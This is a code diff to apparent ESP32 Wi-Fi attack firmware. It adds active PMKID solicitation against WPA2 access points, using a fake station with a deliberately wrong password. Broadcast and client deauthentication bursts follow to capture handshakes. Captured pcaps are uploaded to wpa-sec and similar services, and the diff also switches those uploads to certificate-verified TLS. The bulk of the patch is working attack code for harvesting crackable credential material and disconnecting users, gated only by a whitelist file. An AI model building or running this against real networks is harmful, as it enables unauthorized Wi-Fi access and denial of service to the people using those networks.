@@ -17,6 +17,7 @@
 #include <sys/time.h>
 
 #include "esp_heap_caps.h"
+#include "pmkid_capture.h"
 #include "esp_psram.h"
 
 #include "freertos/FreeRTOS.h"
@@ -784,6 +785,7 @@ static atomic_bool handshake_tx_telemetry_session_active =
     ATOMIC_VAR_INIT(false);
 static atomic_bool handshake_tx_callback_registered =
     ATOMIC_VAR_INIT(false);
+static atomic_bool hs_active_pmkid_probe = ATOMIC_VAR_INIT(false);
 
 static void handshake_tx_done_callback(const esp_80211_tx_info_t *tx_info)
 {
@@ -875,6 +877,7 @@ typedef struct {
     bool beacon_captured;
     bool has_existing_file;     // Already captured on SD
     bool existing_file_checked; // SD lookup is deferred to the worker task
+    uint8_t pmkid_active_attempts; // Must reach two before client deauth is eligible
     int64_t last_deauth_us;
     int64_t first_seen_us;      // FIFO: first discovery time, not refreshed on beacon updates
     uint32_t slot_generation;   // changes whenever this FIFO slot is reused
@@ -2679,6 +2682,7 @@ static bool check_handshake_file_exists(const char *ssid);
 static bool check_handshake_file_exists_by_bssid(const uint8_t *bssid);
 static void handshake_cleanup(void);
 static bool attack_network_with_burst(const wifi_ap_record_t *ap);
+static void hs_run_active_pmkid_probes(const wifi_ap_record_t *ap);
 static const char *display_mode_to_str(display_type_t mode);
 static bool display_mode_from_str(const char *s, display_type_t *out_mode);
 static void display_mode_load_from_nvs(void);
@@ -2960,6 +2964,7 @@ static void wifi_event_handler(void *event_handler_arg,
                                esp_event_base_t event_base,
                                int32_t event_id,
                                void *event_data) {
+    if (atomic_load_explicit(&hs_active_pmkid_probe, memory_order_acquire)) return;
     janos_radio_lease_snapshot_t radio_lease =
         janos_radio_lease_snapshot(&janos_radio_lease);
     if (radio_lease.owner == JANOS_RADIO_OWNER_WPS) {
@@ -4052,6 +4057,8 @@ static void ip_event_handler(void *event_handler_arg,
                              void *event_data) {
     (void)event_handler_arg;
     (void)event_data;
+
+    if (atomic_load_explicit(&hs_active_pmkid_probe, memory_order_acquire)) return;
 
     if (janos_radio_lease_snapshot(&janos_radio_lease).owner ==
         JANOS_RADIO_OWNER_WPS) return;
@@ -7110,6 +7117,7 @@ static bool check_handshake_file_exists(const char *ssid) {
     while ((entry = readdir(dir)) != NULL) {
         // Check if filename starts with the SSID and ends with .pcap
         if (strncmp(entry->d_name, ssid_safe, strlen(ssid_safe)) == 0 &&
+            !pmkid_is_capture_filename(entry->d_name) &&
             hs_ducb_has_suffix(entry->d_name, ".pcap")) {
             found = true;
             break;
@@ -7132,6 +7140,7 @@ static bool check_handshake_file_exists_by_bssid(const uint8_t *bssid) {
     bool found = false;
     while ((entry = readdir(dir)) != NULL) {
         if (strstr(entry->d_name, mac_suffix) != NULL &&
+            !pmkid_is_capture_filename(entry->d_name) &&
             hs_ducb_has_suffix(entry->d_name, ".pcap")) {
             found = true;
             break;
@@ -8541,6 +8550,7 @@ static int hs_find_client(const uint8_t *mac) {
 
 // Add or update client. Returns index.
 static int hs_add_or_update_client(const uint8_t *client_mac, int ap_index, int rssi) {
+    if (is_own_device_mac(client_mac)) return -1;
     int64_t now = esp_timer_get_time();
     int idx = hs_find_client(client_mac);
     if (idx >= 0) {
@@ -9032,6 +9042,10 @@ static void hs_sniffer_process_packet(void *buf, wifi_promiscuous_pkt_type_t typ
     int len = pkt->rx_ctrl.sig_len;
     
     if (len < 24) return; // Minimum 802.11 header
+
+    // PMKID capture is independent of the current D-UCB reservation and of
+    // completed/existing handshake flags. The shared module enforces white.txt.
+    pmkid_capture_observe(frame, (size_t)len, pkt->rx_ctrl.timestamp, NULL, NULL);
     
     uint8_t frame_type = frame[0] & 0xFC;
     uint8_t to_ds = (frame[1] & 0x01) != 0;
@@ -9282,6 +9296,10 @@ static void handshake_cleanup(void) {
     // released its local mutex handle before resetting shared state.
     (void)handshake_quiesce_sniffer_callbacks(portMAX_DELAY);
 
+    // Producers are now quiescent; drain original PMKID frames before freeing
+    // session state or allowing another start_handshake run.
+    pmkid_capture_stop();
+
     // Stop TX completion reporting only after all handshake senders have
     // stopped. The helper is idempotent so forced and cooperative cleanup can
     // safely converge here.
@@ -9454,6 +9472,73 @@ static bool handshake_prepare_sniffer_channel(uint8_t channel)
     return true;
 }
 
+#define HS_PMKID_ACTIVE_ATTEMPTS 2U
+#define HS_PMKID_ACTIVE_LISTEN_MS 2500U
+
+/* Act as a temporary station for long enough to make the target AP run the
+ * open-system authentication/association exchange and emit EAPOL M1. The
+ * configured password is an intentionally wrong, valid-length WPA2 PSK: this
+ * lets the driver complete association and receive M1 without gaining access
+ * to the network. The capture path binds results to our real STA MAC. */
+static void hs_run_active_pmkid_probes(const wifi_ap_record_t *ap)
+{
+    if (!ap) return;
+    wifi_config_t saved = {0};
+    bool have_saved = esp_wifi_get_config(WIFI_IF_STA, &saved) == ESP_OK;
+    wifi_config_t probe = {0};
+    memcpy(probe.sta.ssid, ap->ssid, sizeof(probe.sta.ssid));
+    memcpy(probe.sta.password, "pmkidtry", 8);
+    memcpy(probe.sta.bssid, ap->bssid, sizeof(probe.sta.bssid));
+    probe.sta.bssid_set = 1;
+    probe.sta.channel = ap->primary;
+    probe.sta.threshold.authmode = WIFI_AUTH_WPA2_PSK;
+    probe.sta.pmf_cfg.capable = true;
+    probe.sta.pmf_cfg.required = false;
+
+    uint8_t sta_mac[6] = {0};
+    esp_err_t mac_err = esp_wifi_get_mac(WIFI_IF_STA, sta_mac);
+    atomic_store_explicit(&hs_active_pmkid_probe, true, memory_order_release);
+    (void)esp_wifi_disconnect();
+    vTaskDelay(pdMS_TO_TICKS(100));
+    esp_err_t config_err = mac_err == ESP_OK ?
+        esp_wifi_set_config(WIFI_IF_STA, &probe) : mac_err;
+
+    unsigned completed = 0;
+    for (unsigned ordinal = 1; ordinal <= HS_PMKID_ACTIVE_ATTEMPTS; ++ordinal) {
+        if (!handshake_attack_active || operation_stop_requested) break;
+        pmkid_capture_attempt_begin(ap->bssid, sta_mac, ordinal);
+        printf("[HS-PMKID] active_try=%u/2 action=sta_auth_assoc ssid='%s' channel=%u\n",
+               ordinal, (const char *)ap->ssid, ap->primary);
+        esp_err_t connect_err = config_err;
+        if (connect_err == ESP_OK) connect_err = esp_wifi_connect();
+        if (connect_err == ESP_OK) {
+            for (unsigned elapsed = 0;
+                 elapsed < HS_PMKID_ACTIVE_LISTEN_MS && handshake_attack_active &&
+                 !operation_stop_requested; elapsed += 100U) {
+                vTaskDelay(pdMS_TO_TICKS(100));
+            }
+        }
+        (void)esp_wifi_disconnect();
+        vTaskDelay(pdMS_TO_TICKS(150));
+        pmkid_capture_attempt_end(
+            operation_stop_requested ? "stopped" :
+            (connect_err == ESP_OK ? NULL : "sta_auth_assoc_start_failed"));
+        ++completed;
+    }
+
+    (void)esp_wifi_disconnect();
+    if (have_saved) (void)esp_wifi_set_config(WIFI_IF_STA, &saved);
+    (void)esp_wifi_set_channel(ap->primary, WIFI_SECOND_CHAN_NONE);
+    /* Let queued connect/disconnect events drain while the normal connection
+     * state machine is still suppressed. */
+    vTaskDelay(pdMS_TO_TICKS(200));
+    atomic_store_explicit(&hs_active_pmkid_probe, false, memory_order_release);
+    printf("[HS-PMKID] active_phase=%s bssid=%02X:%02X:%02X:%02X:%02X:%02X attempts=%u next=client_discovery_deauth\n",
+           completed == HS_PMKID_ACTIVE_ATTEMPTS ? "complete" : "interrupted",
+           ap->bssid[0], ap->bssid[1], ap->bssid[2], ap->bssid[3], ap->bssid[4],
+           ap->bssid[5], completed);
+}
+
 // Attack network with deauth burst (5 packets)
 static bool attack_network_with_burst(const wifi_ap_record_t *ap) {
     MY_LOG_INFO(TAG, "Burst attacking '%s' (Ch %d, RSSI: %d dBm)", 
@@ -9464,18 +9549,30 @@ static bool attack_network_with_burst(const wifi_ap_record_t *ap) {
     snprintf(burst_l3, sizeof(burst_l3), "  Ch %d  %ddB", ap->primary, ap->rssi);
     
     if (!handshake_prepare_target_radio(ap)) {
+        printf("[HS-PMKID] result=not_attempted reason=radio_setup_failed\n");
         oled_display_update_full("> WPA Capture", burst_l2, burst_l3, "  Radio error");
         return false;
     }
 
-    // Start attack on this network
+    // Start receive hooks without deauth. Two clientless PMKID solicitations
+    // always run before the legacy client/deauth handshake phase.
     esp_err_t start_err = attack_handshake_start(
-        ap, ATTACK_HANDSHAKE_METHOD_BROADCAST);
+        ap, ATTACK_HANDSHAKE_METHOD_PASSIVE);
     if (start_err != ESP_OK) {
         MY_LOG_INFO(TAG, "Handshake start failed for '%s': %s",
                     ap->ssid, esp_err_to_name(start_err));
         oled_display_update_full("> WPA Capture", burst_l2, burst_l3, "  Start failed");
         return false;
+    }
+    hs_run_active_pmkid_probes(ap);
+    if (!handshake_attack_active || operation_stop_requested) {
+        attack_handshake_stop();
+        return false;
+    }
+    esp_err_t deauth_err = attack_handshake_enable_broadcast_deauth();
+    if (deauth_err != ESP_OK) {
+        MY_LOG_INFO(TAG, "Failed to start deauth phase for '%s': %s",
+                    ap->ssid, esp_err_to_name(deauth_err));
     }
     
     // Wait and check for handshake - 3 deauth bursts with 3s wait each
@@ -9764,6 +9861,48 @@ static void handshake_attack_task_sniffer(void) {
             pending_save = pending_save || pending_capture_ready[i];
         }
 
+        /* PMKID is the first active action for every discovered WPA AP. It is
+         * AP-only and therefore runs even when hs_client_count is zero. One AP
+         * is serviced per dwell; client deauth below remains gated until its
+         * two active attempts have completed. */
+        wifi_ap_record_t pmkid_ap = {0};
+        uint32_t pmkid_slot_generation = 0;
+        bool have_pmkid_ap = false;
+        if (hs_sniffer_lock(hs_sniffer_mutex, portMAX_DELAY)) {
+            for (int i = 0; i < hs_ap_count; ++i) {
+                hs_ap_target_t *ap = &hs_ap_targets[i];
+                if (ap->channel != channel || ap->authmode == WIFI_AUTH_OPEN ||
+                    ap->pmkid_active_attempts >= HS_PMKID_ACTIVE_ATTEMPTS) continue;
+                memcpy(pmkid_ap.bssid, ap->bssid, 6);
+                memcpy(pmkid_ap.ssid, ap->ssid, sizeof(pmkid_ap.ssid));
+                pmkid_ap.primary = ap->channel;
+                pmkid_ap.rssi = ap->rssi;
+                pmkid_ap.authmode = ap->authmode;
+                pmkid_slot_generation = ap->slot_generation;
+                have_pmkid_ap = true;
+                break;
+            }
+            hs_sniffer_unlock(hs_sniffer_mutex);
+        }
+        if (have_pmkid_ap) {
+            printf("[HS-PMKID] phase=before_clients bssid=%02X:%02X:%02X:%02X:%02X:%02X clients_known=%d\n",
+                   pmkid_ap.bssid[0], pmkid_ap.bssid[1], pmkid_ap.bssid[2],
+                   pmkid_ap.bssid[3], pmkid_ap.bssid[4], pmkid_ap.bssid[5],
+                   client_count_snapshot);
+            hs_run_active_pmkid_probes(&pmkid_ap);
+            if (hs_sniffer_lock(hs_sniffer_mutex, portMAX_DELAY)) {
+                int ap_idx = hs_find_ap(pmkid_ap.bssid);
+                if (ap_idx >= 0 &&
+                    hs_ap_targets[ap_idx].slot_generation == pmkid_slot_generation) {
+                    hs_ap_targets[ap_idx].pmkid_active_attempts =
+                        HS_PMKID_ACTIVE_ATTEMPTS;
+                }
+                hs_sniffer_unlock(hs_sniffer_mutex);
+            }
+            if (!handshake_attack_active || operation_stop_requested ||
+                !handshake_prepare_sniffer_channel(channel)) break;
+        }
+
         if (!hs_sniffer_lock(hs_sniffer_mutex, portMAX_DELAY)) {
             ducb_update(ch_idx, 0.0);
             continue;
@@ -9779,7 +9918,8 @@ static void handshake_attack_task_sniffer(void) {
             if (client->hs_ap_index < 0 || client->hs_ap_index >= hs_ap_count) continue;
             hs_ap_target_t *ap = &hs_ap_targets[client->hs_ap_index];
             if (ap->complete || ap->has_existing_file || ap->channel != channel ||
-                ap->authmode == WIFI_AUTH_OPEN) continue;
+                ap->authmode == WIFI_AUTH_OPEN ||
+                ap->pmkid_active_attempts < HS_PMKID_ACTIVE_ATTEMPTS) continue;
             if (client->last_deauth_us > 0 &&
                 (now - client->last_deauth_us) < HS_DEAUTH_COOLDOWN_US) continue;
             uint32_t session_generation = atomic_load_explicit(
@@ -10157,6 +10297,13 @@ static void handshake_attack_task(void *pvParameters) {
     
     MY_LOG_INFO(TAG, "Handshake attack task started.");
     MY_LOG_INFO(TAG, "Mode: %s", handshake_selected_mode ? "Selected networks" : "Sniffer + D-UCB");
+
+    if (!pmkid_capture_start(is_bssid_whitelisted)) {
+        MY_LOG_INFO(TAG, "[HS-PMKID] disabled reason=init_failed; continuing handshake capture");
+    } else {
+        printf("[HS-PMKID] started mode=%s sources=EAPOL-Key,RSN output=*_pmkid.pcap\n",
+               handshake_selected_mode ? "selected" : "D-UCB");
+    }
     
     if (handshake_selected_mode) {
         handshake_attack_task_selected();
@@ -12399,8 +12546,7 @@ static int wpasec_tls_write_all(esp_tls_t *tls, const char *buf, int len) {
 /**
  * @brief Upload a single .pcap file to wpa-sec.stanev.org
  *
- * Uses esp_tls directly (not esp_http_client) for full control over
- * TLS settings, specifically to skip server certificate verification.
+ * Uses esp_tls directly with the certificate bundle for server verification.
  *
  * @param filepath  Full path to .pcap file on SD card
  * @param filename  Just the filename (for the Content-Disposition header)
@@ -12476,9 +12622,9 @@ static int wpasec_upload_file(const char *filepath, const char *filename) {
         "\r\n",
         wpasec_api_key, boundary, body_total_len);
 
-    // Open TLS connection - skip server cert verification (insecure, like reference code)
+    // Open TLS connection with server certificate verification.
     esp_tls_cfg_t tls_cfg = {
-        .crt_bundle_attach = NULL,  // Skip certificate verification in ESP-IDF v6.0
+        .crt_bundle_attach = esp_crt_bundle_attach,
         .timeout_ms = 15000,
     };
 
@@ -12746,7 +12892,7 @@ static int wigle_upload_file(const char *filepath, const char *filename) {
     }
 
     esp_tls_cfg_t tls_cfg = {
-        .crt_bundle_attach = NULL,
+        .crt_bundle_attach = esp_crt_bundle_attach,
         .timeout_ms = 20000,
     };
 
@@ -13278,7 +13424,7 @@ static int wdgwars_poll_upload_job(int job_id) {
             goto cleanup;
         }
 
-        esp_tls_cfg_t tls_cfg = { .crt_bundle_attach = NULL, .timeout_ms = 15000 };
+        esp_tls_cfg_t tls_cfg = { .crt_bundle_attach = esp_crt_bundle_attach, .timeout_ms = 15000 };
         tls = esp_tls_init();
         if (!tls) {
             MY_LOG_INFO(TAG, "  Poll TLS init failed");
@@ -13482,7 +13628,7 @@ static int wdgwars_upload_file(const char *filepath, const char *filename) {
     }
 
     esp_tls_cfg_t tls_cfg = {
-        .crt_bundle_attach = NULL,
+        .crt_bundle_attach = esp_crt_bundle_attach,
         .timeout_ms = 20000,
     };
 
@@ -13726,7 +13872,7 @@ static bool wdgwars_check_in_history(const char *filename) {
                            wdgwars_api_key);
     if (req_len <= 0 || req_len >= 256) goto hist_cleanup;
 
-    esp_tls_cfg_t tls_cfg = { .crt_bundle_attach = NULL, .timeout_ms = 10000 };
+    esp_tls_cfg_t tls_cfg = { .crt_bundle_attach = esp_crt_bundle_attach, .timeout_ms = 10000 };
     tls = esp_tls_init();
     if (!tls) goto hist_cleanup;
     if (esp_tls_conn_http_new_sync(WDGWARS_HISTORY_URL, &tls_cfg, tls) < 0) goto hist_cleanup;
